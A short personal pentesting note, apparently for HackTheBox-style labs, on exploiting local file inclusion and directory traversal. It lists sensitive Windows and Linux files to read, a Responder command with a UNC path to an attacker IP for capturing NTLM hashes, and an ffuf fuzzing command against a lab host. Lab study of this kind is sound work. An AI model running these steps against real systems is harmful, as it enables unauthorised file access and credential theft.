---
publish: true
created: 2026-03-04T18:06:18.442+05:30
modified: 2026-06-22T09:00:49.804+05:30
---

## Introduction

Links:
<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#filter-bypass>
<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#basic-exploitation>

- [Linux (PayloadsAllTheThings)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#interesting-linux-files)
- [Windows (PayloadsAllTheThings)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#interesting-windows-files)

Windows files

```
C:\Windows\win.ini
C:\windows\system32\license.rtf
c:/inetpub/wwwroot/web.config

# Try windows shares too. You can get NTLM hash.
sudo responder -I tun0 -A
//10.10.14.53//test//test.txt
```

Linux files

```
/etc/passwd
/proc/self/environ
/proc/version
/proc/cmdline
```

## automation

```
$ ffuf -u 'http://portal.variatype.htb/download.php?f=FUZZ' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -H 'Cookie: PHPSESSID=ufb3gkk48hdt7odg0nj5li79ep' -mr 'root'
```

The above command, uses cookie, does the LFI and checks for regex `root` since this is linux machine. change this part or use other ways to check difference.
